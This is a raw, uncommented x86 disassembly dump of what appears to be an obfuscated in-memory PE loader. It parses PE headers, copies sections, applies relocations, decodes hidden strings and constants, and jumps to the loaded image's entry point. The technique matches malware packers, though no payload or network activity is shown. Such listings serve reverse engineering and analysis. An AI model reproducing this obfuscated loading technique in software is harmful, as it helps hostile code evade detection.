  426f49:	mov    eax,DWORD PTR [ebp+0x10]
  426f4c:	mov    eax,DWORD PTR [eax+0x1e0]
  426f52:	movzx  ecx,cx
  426f55:	push   ecx
  426f56:	push   DWORD PTR [ebp-0xc]
  426f59:	call   DWORD PTR [eax+0x8]
  426f5c:	jmp    0x426f77
  426f5e:	mov    eax,DWORD PTR [ebp+0xc]
  426f61:	add    eax,DWORD PTR [ebp+0x8]
  426f64:	mov    ecx,DWORD PTR [ebp+0x10]
  426f67:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426f6d:	add    eax,0x2
  426f70:	push   eax
  426f71:	push   DWORD PTR [ebp-0xc]
  426f74:	call   DWORD PTR [ecx+0x8]
  426f77:	mov    DWORD PTR [ebp+0xc],eax
  426f7a:	mov    eax,DWORD PTR [ebp-0x4]
  426f7d:	mov    ecx,DWORD PTR [ebp+0xc]
  426f80:	xor    eax,esi
  426f82:	add    eax,edi
  426f84:	cmp    eax,ecx
  426f86:	mov    eax,DWORD PTR [ebp-0x8]
  426f89:	jne    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebp-0x18]
  426f8e:	xor    eax,esi
  426f90:	lea    eax,[ecx+eax*1+0x3272f1]
  426f97:	mov    DWORD PTR [ebp-0x18],eax
  426f9a:	jmp    0x426fac
  426f9c:	mov    ecx,DWORD PTR [ebp+0xc]
  426f9f:	xor    eax,esi
  426fa1:	add    eax,edi
  426fa3:	imul   eax,ecx
  426fa6:	mov    ecx,DWORD PTR [ebp-0x1c]
  426fa9:	mov    DWORD PTR [ecx+ebx*4],eax
  426fac:	mov    eax,DWORD PTR [ebp-0x8]
  426faf:	xor    eax,esi
  426fb1:	lea    ebx,[ebx+eax*1+0x3272f1]
  426fb8:	mov    eax,DWORD PTR [ebp-0x4]
  426fbb:	mov    ecx,DWORD PTR [ebp-0x1c]
  426fbe:	xor    eax,esi
  426fc0:	add    eax,edi
  426fc2:	cmp    DWORD PTR [ecx+ebx*4],eax
  426fc5:	jne    0x426ef6
  426fcb:	mov    edx,DWORD PTR [ebp-0x10]
  426fce:	mov    ecx,DWORD PTR [ebp-0x2c]
  426fd1:	mov    eax,DWORD PTR [ebp-0x18]
  426fd4:	sub    edx,0x3272f0
  426fda:	xor    edx,esi
  426fdc:	jmp    0x426da6
  426fe1:	mov    ecx,DWORD PTR [ebp-0x4]
  426fe4:	xor    ecx,esi
  426fe6:	add    ecx,edi
  426fe8:	cmp    eax,ecx
  426fea:	mov    eax,DWORD PTR [ebp-0x4]
  426fed:	jne    0x426ff7
  426fef:	mov    eax,DWORD PTR [ebp-0x8]
  426ff2:	jmp    0x426ff7
  426ff4:	mov    eax,DWORD PTR [ebp-0x4]
  426ff7:	xor    eax,esi
  426ff9:	add    eax,edi
  426ffb:	pop    edi
  426ffc:	pop    esi
  426ffd:	pop    ebx
  426ffe:	leave  
  426fff:	ret    0xc
  427002:	push   ebp
  427003:	mov    ebp,esp
  427005:	sub    esp,0x28
  427008:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42700f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427016:	mov    eax,DWORD PTR [ebp+0xc]
  427019:	mov    DWORD PTR [ebp+0xc],eax
  42701c:	push   esi
  42701d:	mov    eax,eax
  42701f:	mov    eax,DWORD PTR [ebp-0x4]
  427022:	mov    esi,DWORD PTR [ebp+0x8]
  427025:	mov    ecx,0x75108aa
  42702a:	xor    eax,ecx
  42702c:	mov    edx,0x3272f1
  427031:	add    eax,edx
  427033:	cmp    esi,eax
  427035:	je     0x42715c
  42703b:	mov    eax,DWORD PTR [ebp+0x8]
  42703e:	mov    esi,DWORD PTR [ebp+0x8]
  427041:	add    esi,DWORD PTR [eax+0x3c]
  427044:	push   edi
  427045:	mov    DWORD PTR [ebp+0xc],esi
  427048:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42704f:	mov    eax,DWORD PTR [ebp-0x1c]
  427052:	mov    esi,DWORD PTR [ebp-0x4]
  427055:	mov    edi,DWORD PTR [ebp+0xc]
  427058:	xor    esi,ecx
  42705a:	xor    eax,ecx
  42705c:	add    esi,edx
  42705e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427065:	je     0x427156
  42706b:	mov    esi,DWORD PTR [ebp+0xc]
  42706e:	mov    eax,DWORD PTR [ebp+0x8]
  427071:	add    eax,DWORD PTR [esi+0xa0]
  427077:	mov    esi,DWORD PTR [ebp+0x8]
  42707a:	mov    edi,DWORD PTR [ebp+0xc]
  42707d:	sub    esi,DWORD PTR [edi+0x34]
  427080:	mov    edi,DWORD PTR [ebp-0x4]
  427083:	xor    edi,ecx
  427085:	add    edi,edx
  427087:	mov    DWORD PTR [ebp-0x24],esi
  42708a:	cmp    esi,edi
  42708c:	je     0x427156
  427092:	mov    esi,DWORD PTR [ebp-0x4]
  427095:	xor    esi,ecx
  427097:	add    esi,edx
  427099:	mov    DWORD PTR [ebp-0x8],esi
  42709c:	push   ebx
  42709d:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4270a4:	jmp    0x427140
  4270a9:	mov    esi,DWORD PTR [ebp-0x4]
  4270ac:	xor    esi,ecx
  4270ae:	lea    edi,[ebx-0x8]
  4270b1:	add    esi,edx
  4270b3:	shr    edi,1
  4270b5:	cmp    esi,edi
  4270b7:	jae    0x427126
  4270b9:	sub    edi,esi
  4270bb:	lea    ebx,[eax+esi*2+0x8]
  4270bf:	mov    DWORD PTR [ebp-0x18],edi
  4270c2:	movzx  esi,WORD PTR [ebx]
  4270c5:	and    esi,0xfff
  4270cb:	mov    DWORD PTR [ebp-0x14],esi
  4270ce:	mov    edi,DWORD PTR [ebp-0x14]
  4270d1:	mov    esi,DWORD PTR [eax]
  4270d3:	sub    esi,edx
  4270d5:	add    edi,esi
  4270d7:	movzx  esi,WORD PTR [ebx]
  4270da:	shr    esi,0xc
  4270dd:	xor    edi,ecx
  4270df:	mov    DWORD PTR [ebp-0x20],edi
  4270e2:	mov    DWORD PTR [ebp-0x14],esi
  4270e5:	mov    esi,DWORD PTR [ebp-0x20]
  4270e8:	mov    edi,DWORD PTR [ebp+0x8]
  4270eb:	xor    esi,ecx
  4270ed:	lea    esi,[esi+edi*1+0x3272f1]
  4270f4:	mov    DWORD PTR [ebp-0x20],esi
  4270f7:	mov    esi,DWORD PTR [ebp-0x10]
  4270fa:	mov    edi,DWORD PTR [ebp-0x14]
  4270fd:	xor    esi,ecx
  4270ff:	add    esi,edx
  427101:	cmp    edi,esi
  427103:	jne    0x42711b
  427105:	mov    esi,DWORD PTR [ebp-0x10]
  427108:	mov    edi,DWORD PTR [ebp-0x14]
  42710b:	xor    esi,ecx
  42710d:	add    esi,edx
  42710f:	cmp    edi,esi
  427111:	jne    0x42711b
  427113:	mov    esi,DWORD PTR [ebp-0x20]
  427116:	mov    edi,DWORD PTR [ebp-0x24]
  427119:	add    DWORD PTR [esi],edi
  42711b:	add    ebx,0x2
  42711e:	dec    DWORD PTR [ebp-0x18]
  427121:	jne    0x4270c2
  427123:	mov    ebx,DWORD PTR [ebp-0xc]
  427126:	add    DWORD PTR [ebp-0x8],ebx
  427129:	mov    esi,DWORD PTR [ebp-0x1c]
  42712c:	mov    edi,DWORD PTR [ebp-0x8]
  42712f:	mov    ebx,DWORD PTR [ebp+0xc]
  427132:	xor    esi,ecx
  427134:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42713b:	jae    0x427155
  42713d:	add    eax,DWORD PTR [ebp-0xc]
  427140:	mov    esi,DWORD PTR [ebp-0x4]
  427143:	mov    ebx,DWORD PTR [eax+0x4]
  427146:	xor    esi,ecx
  427148:	add    esi,edx
  42714a:	mov    DWORD PTR [ebp-0xc],ebx
  42714d:	cmp    ebx,esi
  42714f:	jne    0x4270a9
  427155:	pop    ebx
  427156:	mov    eax,DWORD PTR [ebp-0x28]
  427159:	pop    edi
  42715a:	jmp    0x42715f
  42715c:	mov    eax,DWORD PTR [ebp-0x4]
  42715f:	xor    eax,ecx
  427161:	add    eax,edx
  427163:	pop    esi
  427164:	leave  
  427165:	ret    0x8
  427168:	push   ebp
  427169:	mov    ebp,esp
  42716b:	sub    esp,0xd8
  427171:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427178:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  42717f:	mov    eax,DWORD PTR [ebp-0x4]
  427182:	push   ebx
  427183:	push   esi
  427184:	mov    esi,0x75108aa
  427189:	xor    eax,esi
  42718b:	push   edi
  42718c:	mov    edi,0x3272f1
  427191:	add    eax,edi
  427193:	mov    DWORD PTR [ebp-0x18],eax
  427196:	mov    eax,DWORD PTR [ebp-0x4]
  427199:	xor    eax,esi
  42719b:	add    eax,edi
  42719d:	mov    DWORD PTR [ebp-0x8],eax
  4271a0:	mov    ebx,DWORD PTR [ebp+0x20]
  4271a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4271a6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4271a9:	xor    eax,ecx
  4271ab:	mov    DWORD PTR [ebp-0x1c],eax
  4271ae:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4271b5:	mov    eax,DWORD PTR [ebp-0xc]
  4271b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4271bb:	xor    eax,ecx
  4271bd:	mov    DWORD PTR [ebp-0xc],eax
  4271c0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4271c7:	mov    eax,DWORD PTR [ebp-0x10]
  4271ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4271cd:	xor    eax,ecx
  4271cf:	mov    DWORD PTR [ebp-0x10],eax
  4271d2:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4271d9:	mov    eax,DWORD PTR [ebp-0x28]
  4271dc:	mov    ecx,DWORD PTR [ebp-0x28]
  4271df:	xor    eax,ecx
  4271e1:	mov    DWORD PTR [ebp-0x28],eax
  4271e4:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4271eb:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4271f2:	mov    eax,DWORD PTR [ebp+0x8]
  4271f5:	test   eax,eax
  4271f7:	je     0x427680
  4271fd:	mov    eax,DWORD PTR [ebp+0xc]
  427200:	test   eax,eax
  427202:	je     0x427680
  427208:	mov    eax,DWORD PTR [ebp+0x18]
  42720b:	test   eax,eax
  42720d:	je     0x427680
  427213:	mov    eax,DWORD PTR [ebp+0x20]
  427216:	mov    ecx,DWORD PTR [ebp+0x8]
  427219:	xor    eax,0x8aa
  42721e:	add    eax,0x72f1
  427223:	cmp    WORD PTR [ecx],ax
  427226:	jne    0x427680
  42722c:	mov    eax,DWORD PTR [ebp-0x4]
  42722f:	xor    eax,esi
  427231:	add    eax,edi
  427233:	mov    DWORD PTR [ebp-0x30],eax
  427236:	mov    eax,DWORD PTR [ebp-0x4]
  427239:	mov    ecx,DWORD PTR [ebp+0x8]
  42723c:	mov    eax,DWORD PTR [ebp+0x8]
  42723f:	add    eax,DWORD PTR [ecx+0x3c]
  427242:	mov    DWORD PTR [ebp+0xc],eax
  427245:	mov    eax,DWORD PTR [eax+0x50]
  427248:	test   eax,eax
  42724a:	je     0x427680
  427250:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427257:	mov    eax,DWORD PTR [ebp-0x2c]
  42725a:	xor    eax,esi
  42725c:	add    eax,edi
  42725e:	mov    DWORD PTR [ebp-0x2c],eax
  427261:	mov    eax,DWORD PTR [ebp-0x4]
  427264:	mov    eax,DWORD PTR [ebx+0x190]
  42726a:	mov    ecx,DWORD PTR [eax]
  42726c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42726f:	add    ecx,DWORD PTR [eax]
  427271:	mov    eax,DWORD PTR [ebp-0x4]
  427274:	mov    eax,DWORD PTR [ebx+0x18c]
  42727a:	mov    edx,DWORD PTR [eax]
  42727c:	mov    DWORD PTR [ebp-0x20],ecx
  42727f:	mov    DWORD PTR [ebp+0x20],edx
  427282:	cmp    edx,edx
  427284:	jne    0x4272b8
  427286:	mov    eax,DWORD PTR [ebx+0x1e0]
  42728c:	lea    edx,[ebp-0x18]
  42728f:	push   edx
  427290:	mov    edx,DWORD PTR [ebp-0xc]
  427293:	xor    edx,esi
  427295:	add    edx,edi
  427297:	push   edx
  427298:	push   DWORD PTR [ecx+0x50]
  42729b:	push   DWORD PTR [ebp+0x20]
  42729e:	call   DWORD PTR [eax+0x1c]
  4272a1:	mov    eax,DWORD PTR [ebp-0x20]
  4272a4:	mov    ecx,DWORD PTR [eax+0x54]
  4272a7:	mov    eax,DWORD PTR [eax+0x50]
  4272aa:	sub    eax,ecx
  4272ac:	add    ecx,DWORD PTR [ebp+0x20]
  4272af:	push   ecx
  4272b0:	call   0x427c1b
  4272b5:	mov    edx,DWORD PTR [ebp+0x20]
  4272b8:	mov    eax,DWORD PTR [ebx+0x194]
  4272be:	mov    DWORD PTR [eax],edx
  4272c0:	mov    eax,DWORD PTR [ebp+0xc]
  4272c3:	push   DWORD PTR [eax+0x54]
  4272c6:	push   DWORD PTR [ebp+0x8]
  4272c9:	push   edx
  4272ca:	call   0x427b11
  4272cf:	mov    ecx,DWORD PTR [ebp+0x20]
  4272d2:	mov    eax,DWORD PTR [ecx+0x3c]
  4272d5:	add    eax,ecx
  4272d7:	movzx  ecx,WORD PTR [eax+0x14]
  4272db:	lea    ecx,[ecx+eax*1+0x18]
  4272df:	mov    DWORD PTR [ebp+0x18],ecx
  4272e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e5:	movzx  edx,WORD PTR [eax+0x6]
  4272e9:	xor    ecx,esi
  4272eb:	add    ecx,edi
  4272ed:	mov    DWORD PTR [ebp+0xc],eax
  4272f0:	cmp    edx,ecx
  4272f2:	je     0x42739f
  4272f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4272fb:	xor    ecx,esi
  4272fd:	add    ecx,edi
  4272ff:	mov    DWORD PTR [ebp-0x8],ecx
  427302:	mov    ecx,DWORD PTR [ebp-0x24]
  427305:	movzx  edx,WORD PTR [eax+0x6]
  427309:	xor    ecx,esi
  42730b:	sub    edx,ecx
  42730d:	sub    edx,edi
  42730f:	cmp    DWORD PTR [ebp-0x8],edx
  427312:	ja     0x42739f
  427318:	mov    edx,DWORD PTR [ebp+0x18]
  42731b:	add    edx,0x8
  42731e:	mov    DWORD PTR [ebp+0x18],edx
  427321:	jmp    0x427326
  427323:	mov    edx,DWORD PTR [ebp+0x18]
  427326:	mov    eax,DWORD PTR [eax+0x38]
  427329:	lea    ecx,[eax-0x1]
  42732c:	mov    DWORD PTR [ebp-0x38],eax
  42732f:	mov    eax,DWORD PTR [edx]
  427331:	test   eax,ecx
  427333:	je     0x42733c
  427335:	not    ecx
  427337:	and    eax,ecx
  427339:	add    eax,DWORD PTR [ebp-0x38]
  42733c:	mov    ecx,DWORD PTR [edx+0x4]
  42733f:	add    ecx,DWORD PTR [ebp+0x20]
  427342:	push   ecx
  427343:	call   0x427c1b
  427348:	mov    edx,DWORD PTR [ebp-0x4]
  42734b:	mov    eax,DWORD PTR [ebp+0x18]
  42734e:	mov    ecx,DWORD PTR [eax+0x8]
  427351:	xor    edx,esi
  427353:	add    edx,edi
  427355:	cmp    ecx,edx
  427357:	je     0x427370
  427359:	push   ecx
  42735a:	mov    ecx,DWORD PTR [ebp+0x8]
  42735d:	add    ecx,DWORD PTR [eax+0xc]
  427360:	mov    eax,DWORD PTR [eax+0x4]
  427363:	add    eax,DWORD PTR [ebp+0x20]
  427366:	push   ecx
  427367:	push   eax
  427368:	call   0x427b11
  42736d:	mov    eax,DWORD PTR [ebp+0x18]
  427370:	mov    ecx,DWORD PTR [ebp-0x24]
  427373:	mov    edx,DWORD PTR [ebp-0x8]
  427376:	add    eax,0x28
  427379:	xor    ecx,esi
  42737b:	lea    ecx,[edx+ecx*1+0x3272f1]
  427382:	mov    edx,DWORD PTR [ebp+0xc]
  427385:	mov    DWORD PTR [ebp+0x18],eax
  427388:	mov    eax,DWORD PTR [ebp-0x24]
  42738b:	movzx  edx,WORD PTR [edx+0x6]
  42738f:	xor    eax,esi
  427391:	sub    edx,eax
  427393:	mov    eax,DWORD PTR [ebp+0xc]
  427396:	sub    edx,edi
  427398:	mov    DWORD PTR [ebp-0x8],ecx
  42739b:	cmp    ecx,edx
  42739d:	jbe    0x427323
  42739f:	mov    edx,DWORD PTR [ebx+0x18c]
  4273a5:	mov    ecx,DWORD PTR [ebp+0x20]
  4273a8:	cmp    ecx,DWORD PTR [edx]
  4273aa:	jne    0x4273d3
  4273ac:	mov    eax,DWORD PTR [ebx+0x1e0]
  4273b2:	lea    edx,[ebp-0x18]
  4273b5:	push   edx
  4273b6:	mov    edx,DWORD PTR [ebp-0x10]
  4273b9:	xor    edx,esi
  4273bb:	add    edx,edi
  4273bd:	push   edx
  4273be:	mov    edx,DWORD PTR [ebp-0x20]
  4273c1:	push   DWORD PTR [edx+0x54]
  4273c4:	push   ecx
  4273c5:	call   DWORD PTR [eax+0x1c]
  4273c8:	test   eax,eax
  4273ca:	je     0x427671
  4273d0:	mov    eax,DWORD PTR [ebp+0xc]
  4273d3:	mov    ecx,DWORD PTR [ebx+0x1c8]
  4273d9:	mov    ecx,DWORD PTR [ecx]
  4273db:	xor    ecx,esi
  4273dd:	add    ecx,edi
  4273df:	je     0x42759c
  4273e5:	mov    eax,DWORD PTR [ebp-0x4]
  4273e8:	xor    eax,esi
  4273ea:	add    eax,edi
  4273ec:	and    DWORD PTR [ebp+0x8],0x0
  4273f0:	mov    DWORD PTR [ebp-0x14],eax
  4273f3:	mov    eax,0xf89c85d9
  4273f8:	lea    ecx,[eax-0x8]
  4273fb:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427402:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  427409:	mov    DWORD PTR [ebp-0x50],eax
  42740c:	mov    DWORD PTR [ebp-0x4c],ecx
  42740f:	mov    DWORD PTR [ebp-0x48],ecx
  427412:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427419:	mov    edx,DWORD PTR [ebp+0x8]
  42741c:	mov    ecx,0x8aa
  427421:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427426:	mov    edx,0x72f1
  42742b:	add    cx,dx
  42742e:	mov    edx,DWORD PTR [ebp+0x8]
  427431:	inc    DWORD PTR [ebp+0x8]
  427434:	cmp    DWORD PTR [ebp+0x8],0x6
  427438:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427440:	jb     0x427419
  427442:	mov    ecx,0xf89c852b
  427447:	mov    DWORD PTR [ebp-0xb0],eax
  42744d:	mov    DWORD PTR [ebp-0x9c],eax
  427453:	mov    DWORD PTR [ebp-0x74],eax
  427456:	mov    DWORD PTR [ebp-0x70],eax
  427459:	lea    eax,[ecx-0x3]
  42745c:	mov    edx,0xf89c85ff
  427461:	mov    DWORD PTR [ebp-0x64],eax
  427464:	mov    DWORD PTR [ebp-0x60],eax
  427467:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  427471:	mov    DWORD PTR [ebp-0xac],ecx
  427477:	mov    DWORD PTR [ebp-0xa8],edx
  42747d:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427487:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427491:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  42749b:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  4274a5:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  4274af:	mov    DWORD PTR [ebp-0x8c],ecx
  4274b5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4274bf:	mov    DWORD PTR [ebp-0x84],edx
  4274c5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4274cc:	mov    DWORD PTR [ebp-0x7c],ecx
  4274cf:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  4274d6:	mov    DWORD PTR [ebp-0x6c],ecx
  4274d9:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  4274e0:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  4274e7:	xor    eax,eax
  4274e9:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4274f0:	xor    cl,0xaa
  4274f3:	sub    cl,0xf
  4274f6:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4274fd:	inc    eax
  4274fe:	cmp    eax,0x17
  427501:	jb     0x4274e9
  427503:	mov    eax,DWORD PTR [ebx+0x1e0]
  427509:	lea    ecx,[ebp-0xc0]
  42750f:	push   ecx
  427510:	call   DWORD PTR [eax+0x4]
  427513:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427519:	lea    edx,[ebp-0xd8]
  42751f:	push   edx
  427520:	push   eax
  427521:	call   DWORD PTR [ecx+0x8]
  427524:	mov    DWORD PTR [ebp-0x40],eax
  427527:	lea    eax,[ebp-0x14]
  42752a:	push   eax
  42752b:	mov    eax,DWORD PTR [ebx+0x18c]
  427531:	push   DWORD PTR [eax]
  427533:	mov    eax,DWORD PTR [ebp-0x40]
  427536:	call   eax
  427538:	mov    eax,DWORD PTR [ebp-0x4]
  42753b:	xor    eax,esi
  42753d:	add    eax,edi
  42753f:	mov    DWORD PTR [ebp-0x34],eax
  427542:	mov    ecx,DWORD PTR [ebp-0x4]
  427545:	mov    eax,DWORD PTR [ebp-0x14]
  427548:	xor    ecx,esi
  42754a:	add    ecx,edi
  42754c:	cmp    eax,ecx
  42754e:	je     0x427599
  427550:	mov    DWORD PTR [ebp-0x3c],eax
  427553:	jmp    0x427564
  427555:	mov    eax,DWORD PTR [eax]
  427557:	mov    ecx,DWORD PTR [ebp-0x3c]
  42755a:	mov    DWORD PTR [ebp-0x14],eax
  42755d:	mov    eax,DWORD PTR [ebp-0x14]
  427560:	cmp    eax,ecx
  427562:	je     0x427571
  427564:	mov    edx,DWORD PTR [eax+0x18]
  427567:	mov    ecx,DWORD PTR [ebx+0x18c]
  42756d:	cmp    edx,DWORD PTR [ecx]
  42756f:	jne    0x427555
  427571:	mov    ecx,DWORD PTR [ebx+0x18c]
  427577:	mov    edx,DWORD PTR [eax+0x18]
  42757a:	cmp    edx,DWORD PTR [ecx]
  42757c:	jne    0x427599
  42757e:	mov    ecx,DWORD PTR [ebx+0x190]
  427584:	mov    edx,DWORD PTR [ebp-0x20]
  427587:	mov    edx,DWORD PTR [edx+0x28]
  42758a:	add    edx,DWORD PTR [ecx]
  42758c:	mov    DWORD PTR [eax+0x1c],edx
  42758f:	mov    eax,DWORD PTR [ebp-0x24]
  427592:	xor    eax,esi
  427594:	add    eax,edi
  427596:	mov    DWORD PTR [ebp-0x34],eax
  427599:	mov    eax,DWORD PTR [ebp+0xc]
  42759c:	push   ebx
  42759d:	push   eax
  42759e:	push   DWORD PTR [ebp+0x20]
  4275a1:	call   0x426d1f
  4275a6:	test   eax,eax
  4275a8:	je     0x427671
  4275ae:	push   DWORD PTR [ebp+0xc]
  4275b1:	mov    ecx,ebx
  4275b3:	push   DWORD PTR [ebp+0x20]
  4275b6:	call   0x426c78
  4275bb:	test   eax,eax
  4275bd:	je     0x427671
  4275c3:	mov    eax,DWORD PTR [ebp+0xc]
  4275c6:	mov    edx,DWORD PTR [ebp+0x20]
  4275c9:	mov    ecx,ebx
  4275cb:	call   0x426b51
  4275d0:	test   eax,eax
  4275d2:	je     0x427671
  4275d8:	push   ebx
  4275d9:	push   DWORD PTR [ebp+0x20]
  4275dc:	call   0x427002
  4275e1:	test   eax,eax
  4275e3:	je     0x427671
  4275e9:	mov    eax,DWORD PTR [ebx+0x18c]
  4275ef:	mov    edx,DWORD PTR [ebp+0x20]
  4275f2:	cmp    edx,DWORD PTR [eax]
  4275f4:	jne    0x427610
  4275f6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4275fc:	lea    ecx,[ebp-0x18]
  4275ff:	push   ecx
  427600:	push   DWORD PTR [ebp-0x18]
  427603:	mov    ecx,DWORD PTR [ebp-0x20]
  427606:	push   DWORD PTR [ecx+0x54]
  427609:	push   edx
  42760a:	call   DWORD PTR [eax+0x1c]
  42760d:	mov    edx,DWORD PTR [ebp+0x20]
  427610:	mov    eax,DWORD PTR [ebx+0x1c8]
  427616:	mov    eax,DWORD PTR [eax]
  427618:	xor    eax,esi
  42761a:	add    eax,edi
  42761c:	je     0x427655
  42761e:	mov    ecx,DWORD PTR [ebp+0xc]
  427621:	mov    eax,DWORD PTR [ecx+0x28]
  427624:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42762b:	mov    esi,DWORD PTR [ebp+0x8]
  42762e:	push   DWORD PTR [ebp+0x14]
  427631:	xor    esi,0x8aa
  427637:	push   DWORD PTR [ebp+0x10]
  42763a:	add    esi,0x72f1
  427640:	or     WORD PTR [ecx+0x16],si
  427644:	add    eax,edx
  427646:	push   edx
  427647:	call   eax
  427649:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427653:	jmp    0x42765f
  427655:	mov    eax,DWORD PTR [ebp+0xc]
  427658:	mov    eax,DWORD PTR [eax+0x28]
  42765b:	add    eax,edx
  42765d:	call   eax
  42765f:	mov    DWORD PTR [ebp-0x8],eax
  427662:	mov    eax,DWORD PTR [ebp-0x8]
  427665:	mov    ecx,DWORD PTR [ebp+0x1c]
  427668:	mov    DWORD PTR [ecx],eax
  42766a:	mov    DWORD PTR [ebp-0x30],0x1
  427671:	cmp    DWORD PTR [ebp-0x30],0x0
  427675:	jne    0x42767b
  427677:	and    DWORD PTR [ebp+0x20],0x0
  42767b:	mov    eax,DWORD PTR [ebp+0x20]
  42767e:	jmp    0x427682
  427680:	xor    eax,eax
  427682:	pop    edi
  427683:	pop    esi
  427684:	pop    ebx
  427685:	leave  
  427686:	ret    0x1c
  427689:	push   ebp
  42768a:	mov    ebp,esp
  42768c:	movzx  edx,WORD PTR [ecx+0x6]
  427690:	movzx  eax,WORD PTR [ecx+0x14]
  427694:	push   ebx
  427695:	push   edi
  427696:	xor    edi,edi
  427698:	lea    eax,[eax+ecx*1+0x18]
  42769c:	test   edx,edx
  42769e:	je     0x4276bf
  4276a0:	mov    ecx,DWORD PTR [eax+0xc]
  4276a3:	lea    ebx,[ecx+esi*1]
  4276a6:	cmp    DWORD PTR [ebp+0x8],ebx
  4276a9:	jb     0x4276b7
  4276ab:	mov    ebx,DWORD PTR [eax+0x8]
  4276ae:	add    ebx,ecx
  4276b0:	add    ebx,esi
  4276b2:	cmp    DWORD PTR [ebp+0x8],ebx
  4276b5:	jb     0x4276c1
  4276b7:	add    eax,0x28
  4276ba:	inc    edi
  4276bb:	cmp    edi,edx
  4276bd:	jb     0x4276a0
  4276bf:	xor    eax,eax
  4276c1:	pop    edi
  4276c2:	pop    ebx
  4276c3:	pop    ebp
  4276c4:	ret    0x4
  4276c7:	push   ebp
  4276c8:	mov    ebp,esp
  4276ca:	sub    esp,0x34
  4276cd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4276d4:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  4276db:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  4276e2:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  4276e9:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  4276f0:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  4276f7:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  4276fe:	mov    DWORD PTR [ebp-0x10],eax
  427701:	mov    eax,DWORD PTR [ebp+0x8]
  427704:	mov    DWORD PTR [ebp-0x14],eax
  427707:	mov    eax,DWORD PTR [ebp-0xc]
  42770a:	push   ebx
  42770b:	mov    ecx,0x75108aa
  427710:	xor    eax,ecx
  427712:	push   esi
  427713:	mov    esi,DWORD PTR [ebp-0x10]
  427716:	mov    edx,0x3272f1
  42771b:	add    eax,edx
  42771d:	push   edi
  42771e:	cmp    esi,eax
  427720:	je     0x4278ff
  427726:	mov    eax,DWORD PTR [ebp-0xc]
  427729:	mov    esi,DWORD PTR [ebp-0x14]
  42772c:	xor    eax,ecx
  42772e:	add    eax,edx
  427730:	cmp    esi,eax
  427732:	je     0x4278ff
  427738:	mov    eax,DWORD PTR [ebp-0xc]
  42773b:	xor    eax,ecx
  42773d:	add    eax,edx
  42773f:	mov    DWORD PTR [ebp-0x24],eax
  427742:	mov    eax,DWORD PTR [ebp-0xc]
  427745:	xor    eax,ecx
  427747:	add    eax,edx
  427749:	mov    DWORD PTR [ebp-0x28],eax
  42774c:	mov    edi,DWORD PTR [ebp-0x20]
  42774f:	mov    ebx,DWORD PTR [ebp-0x8]
  427752:	mov    esi,0x8aa
  427757:	xor    edi,esi
  427759:	mov    eax,0x72f1
  42775e:	xor    ebx,esi
  427760:	add    edi,eax
  427762:	add    ebx,eax
  427764:	sub    ebx,edi
  427766:	mov    WORD PTR [ebp-0x8],bx
  42776a:	jmp    0x42782f
  42776f:	mov    edi,DWORD PTR [ebp-0xc]
  427772:	mov    bx,WORD PTR [ebp-0x4]
  427776:	xor    edi,esi
  427778:	add    edi,eax
  42777a:	cmp    bx,di
  42777d:	je     0x427871
  427783:	mov    edi,DWORD PTR [ebp-0xc]
  427786:	mov    ebx,DWORD PTR [ebp+0xc]
  427789:	xor    edi,ecx
  42778b:	add    edi,edx
  42778d:	cmp    ebx,edi
  42778f:	mov    di,WORD PTR [ebp-0x4]
  427793:	mov    bx,WORD PTR [ebp+0x8]
  427797:	je     0x427802
  427799:	cmp    bx,di
  42779c:	je     0x42780b
  42779e:	mov    edi,DWORD PTR [ebp-0x20]
  4277a1:	mov    bx,WORD PTR [ebp+0x8]
  4277a5:	xor    edi,esi
  4277a7:	add    edi,eax
  4277a9:	cmp    bx,di
  4277ac:	jb     0x4277cc
